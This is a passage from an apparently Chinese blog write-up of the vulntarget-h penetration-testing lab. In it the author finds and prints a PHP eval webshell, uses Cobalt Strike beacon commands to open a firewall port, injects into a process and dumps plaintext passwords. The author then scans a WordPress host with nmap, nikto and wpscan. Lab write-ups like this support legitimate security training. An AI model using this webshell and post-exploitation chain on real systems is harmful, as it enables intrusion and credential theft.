C:\inetpub\logs\LogFiles\W3SVC1\u_ex220702.log</span><br><span class="line">[+] host called home, sent: 82 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"><span class="comment">#Software: Microsoft Internet Information Services 7.5</span></span><br><span class="line"><span class="comment">#Version: 1.0</span></span><br><span class="line"><span class="comment">#Date: 2022-07-02 04:48:37</span></span><br><span class="line"><span class="comment">#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken</span></span><br><span class="line">...</span><br><span class="line">2022-07-02 10:18:01 192.168.153.130 GET /aaa/dsuijaddjsfvos.php - 80 - 192.168.153.128 CertUtil+URL+Agent 404 0 64 15</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上方教程参考于：<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/1129108.html">命令执行漏洞[无]回显[不]出网利用技巧</a></p>
</blockquote>
<ul>
<li><code>dsuijaddjsfvos.php</code>该就是<code>c:\phpstudy_pro\COM\a.txt</code>文件的内容。我们尝试使用<code>curl</code>访问一下<code>dsuijaddjsfvos.php</code>。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.128/dsuijaddjsfvos.php</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;br /&gt;<span class="built_in">eval</span>(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;[&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #DD0000&quot;</span>&gt;<span class="string">&#x27;shell&#x27;</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;col&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;</span>color: <span class="comment">#0000BB&quot;&gt;?&gt;&lt;/span&gt;</span></span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">==============================================================</span><br><span class="line"><span class="comment"># 通过浏览器访问得到的结果。</span></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>dsuijaddjsfvos.php</code>该文件是一句话木马。接下来我们需要使用CS生成一个目录然后再进行免杀。</p>
</li>
<li><p>在生成木马之前我们需要创建一个监听器。</p>
</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_07-10-45.png" alt="Screenshot_2022-07-02_07-10-45.png"></p>
<ul>
<li>你可以能会疑惑为什么需要把监听地址改为<strong>192.168.153.130</strong>。因为Windows Server 2008有两个网卡其中一个网卡是不能和Windows 7通信，<strong>192.168.153.130</strong>这个网卡是可以和Windows 7通信。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_07-11-12.png" alt="Screenshot_2022-07-02_07-11-12.png"></p>
<ul>
<li>由于我们这个反向连接需要在Windows Sever 2008开放4444端口否则会无法连接。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell netsh firewall <span class="built_in">set</span> portopening tcp 4444 <span class="built_in">enable</span></span><br><span class="line">[*] Tasked beacon to run: netsh firewall <span class="built_in">set</span> portopening tcp 4444 <span class="built_in">enable</span></span><br><span class="line">[+] host called home, sent: 77 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">重要信息: 已成功执行命令。</span><br><span class="line">但不赞成使用 <span class="string">&quot;netsh firewall&quot;</span>；</span><br><span class="line">而应该使用 <span class="string">&quot;netsh advfirewall firewall&quot;</span>。</span><br><span class="line">有关使用 <span class="string">&quot;netsh advfirewall firewall&quot;</span> 命令</span><br><span class="line">而非 <span class="string">&quot;netsh firewall&quot;</span> 的详细信息，请参阅</span><br><span class="line">http://go.microsoft.com/fwlink/?linkid=121488</span><br><span class="line">上的 KB 文章 947709。</span><br><span class="line"></span><br><span class="line">确定。</span><br></pre></td></tr></table></figure>

<ul>
<li><p>接下来我们就需要利用蚁剑把木马上传到Windows 7的<code>C:\phpstudy_pro\</code>目录然后再执行木马。（为什么不是上传到<code>WWW</code>目录，因为<code>C:\phpstudy_pro\</code>没有写入权限。）</p>
</li>
<li><p>使用蚁剑连接<code>dsuijaddjsfvos.php</code>文件的一句话木马。在连接一句话木马之前需要配置一下蚁剑的代理。</p>
</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_06-59-12.png" alt="Screenshot_2022-07-02_06-59-12.png"></p>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_06-59-45.png" alt="Screenshot_2022-07-02_06-59-45.png"></p>
<ul>
<li>执行木马。这里你可以通过上图目录空白右击鼠标打开菜单找到打开终端选项运行木马。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-02-35.png" alt="Screenshot_2022-07-02_08-02-35.png"></p>
<ul>
<li><p>提升权限。</p>
</li>
<li><p>使用<code>systeminfo</code>命令并没有找到可以提升权限的漏洞。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell systeminfo</span><br><span class="line">[*] Tasked beacon to run: systeminfo</span><br><span class="line">[+] host called home, sent: 41 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">主机名:           WIN-HF4NQED9HKF</span><br><span class="line">OS 名称:          Microsoft Windows 7 企业版 </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00392-918-5000002-85557</span><br><span class="line">初始安装日期:     2022/3/30, 10:48:57</span><br><span class="line">系统启动时间:     2022/7/2, 13:07:54</span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 62 Stepping 4 GenuineIntel ~3000 Mhz</span><br><span class="line">                  [02]: Intel64 Family 6 Model 62 Stepping 4 GenuineIntel ~3000 Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD 6.00, 2020/11/12</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     2,047 MB</span><br><span class="line">可用的物理内存:   1,024 MB</span><br><span class="line">虚拟内存: 最大值: 4,095 MB</span><br><span class="line">虚拟内存: 可用:   3,008 MB</span><br><span class="line">虚拟内存: 使用中: 1,087 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       \\WIN-HF4NQED9HKF</span><br><span class="line">修补程序:         安装了 3 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB4474419</span><br><span class="line">                  [03]: KB976902</span><br><span class="line">网卡:             安装了 1 个 NIC。</span><br><span class="line">                  [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                      连接名:      本地连接 2</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.153.128</span><br><span class="line">                        [02]: fe80::8f8:10d9:c4a9:f089</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试进程注入，在注入之前需要找到可以注入的进程。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-12-47.png" alt="Screenshot_2022-07-02_08-12-47.png"></p>
<ul>
<li>在进程列表找到<strong>phpStudyServer.exe</strong>的进程，我们就尝试注入这个进程吧。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-16-41.png" alt="Screenshot_2022-07-02_08-16-41.png"></p>
<ul>
<li>成功注入<strong>phpStudyServer.exe</strong>进程。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-17-04.png" alt="Screenshot_2022-07-02_08-17-04.png"></p>
<ul>
<li>抓取明文密码。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_08-22-16.png" alt="Screenshot_2022-07-02_08-22-16.png"></p>
</blockquote>
<h3 id="Windws-10"><a href="#Windws-10" class="headerlink" title="Windws 10"></a>Windws 10</h3><blockquote>
<p>由于本文章头开已经知道Windows 10的IP地址这里我就越过扫描192.168.153.0&#x2F;24这个网段。</p>
</blockquote>
<h4 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
<li>使用CS端口扫描功能查看Windows 10开放的端口。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; portscan 192.168.153.129 1-1024,3389,5900-6000 none 1024</span><br><span class="line">[*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 192.168.153.129</span><br><span class="line">[+] host called home, sent: 75389 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">192.168.153.128:445</span><br><span class="line">192.168.153.130:445 (platform: 500 version: 6.1 name: WIN-7DSM1JVE9PO domain: WORKGROUP)</span><br><span class="line">Scanner module is complete</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">192.168.153.129:80</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">Scanner module is complete</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>nmap</code>扫描<strong>Windows 10</strong>的80端口是否存在漏洞。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 nmap -p80 192.168.153.129 --script=vuln</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 09:12 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span><br><span class="line">...</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.153.129</span><br><span class="line">Host is up (0.20s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 232.50 seconds</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过上面的返回结果我们可以发现<strong>cve2014-3704</strong>这个漏洞并不属于WordPress，接下来我们就使用<code>nikto</code>的看看能不能找到有用的信息。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 nikto -host http://192.168.153.129</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">...</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">...</span><br><span class="line">+ Target IP:          192.168.153.129</span><br><span class="line">+ Target Hostname:    192.168.153.129</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-07-02 09:22:10 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">+ Retrieved x-powered-by header: PHP/7.3.4</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ Uncommon header <span class="string">&#x27;link&#x27;</span> found, with contents: &lt;http://192.168.153.129/index.php/wp-json/&gt;; rel=<span class="string">&quot;https://api.w.org/&quot;</span></span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">+ Uncommon header <span class="string">&#x27;x-redirect-by&#x27;</span> found, with contents: WordPress</span><br><span class="line">+ Entry <span class="string">&#x27;/wp-admin/&#x27;</span> <span class="keyword">in</span> robots.txt returned a non-forbidden or redirect HTTP code (302)</span><br><span class="line">+ <span class="string">&quot;robots.txt&quot;</span> contains 2 entries <span class="built_in">which</span> should be manually viewed.</span><br><span class="line">+ ERROR: Error <span class="built_in">limit</span> (20) reached <span class="keyword">for</span> host, giving up. Last error: error reading HTTP response</span><br><span class="line">+ ERROR: Error <span class="built_in">limit</span> (20) reached <span class="keyword">for</span> host, giving up. Last error: </span><br><span class="line">+ Scan terminated:  15 error(s) and 8 item(s) reported on remote host</span><br><span class="line">+ End Time:           2022-07-02 09:33:10 (GMT-4) (660 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>

<ul>
<li>通过上面的信息可以发现该网站是使用了<strong>WordPress</strong>，我们就可以使用<code>wpscan</code>来收集信息。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 wpscan --url http://192.168.153.129</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.22</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span></span><br><span class="line"><span class="string">[+] URL: http://192.168.153.129/ [192.168.153.129]</span></span><br><span class="line"><span class="string">[+] Started: Sat Jul  2 09:34:04 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span></span><br><span class="line"><span class="string"> |  - X-Powered-By: PHP/7.3.4</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] robots.txt found: http://192.168.153.129/robots.txt</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - /wp-admin/</span></span><br><span class="line"><span class="string"> |  - /wp-admin/admin-ajax.php</span></span><br><span class="line"><span class="string"> | Found By: Robots Txt (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://192.168.153.129/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress readme found: http://192.168.153.129/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://192.168.153.129/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.9.2 identified (Outdated, released on 2022-03-11).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.153.129/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9.2&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.153.129/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9.2&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentytwentytwo</span></span><br><span class="line"><span class="string"> | Location: http://192.168.153.129/wp-content/themes/twentytwentytwo/</span></span><br><span class="line"><span class="string"> | Last Updated: 2022-05-24T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.153.129/wp-content/themes/twentytwentytwo/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.2</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.153.129/wp-content/themes/twentytwentytwo/style.css?ver=1.1</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty-Two</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwentytwo/</span></span><br><span class="line"><span class="string"> | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Css Style In 404 Page (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.153.129/wp-content/themes/twentytwentytwo/style.css?ver=1.1, Match: &#x27;</span>Version: 1.1<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Plugin(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] mail-masta</span></span><br><span class="line"><span class="string"> | Location: http://192.168.153.129/wp-content/plugins/mail-masta/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2014-09-19T07:52:00.000Z</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Urls In 404 Page (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.153.129/wp-content/plugins/mail-masta/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK                                         &gt; (0 / 137)  0.00%  ETA: ??:??:??</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:04:37 &lt;=============================================================================&gt; (137 / 137) 100.00% Time: 00:04:37</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Sat Jul  2 09:42:55 2022</span></span><br><span class="line"><span class="string">[+] Requests Done: 172</span></span><br><span class="line"><span class="string">[+] Cached Requests: 7</span></span><br><span class="line"><span class="string">[+] Data Sent: 43.302 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 372.511 KB</span></span><br><span class="line"><span 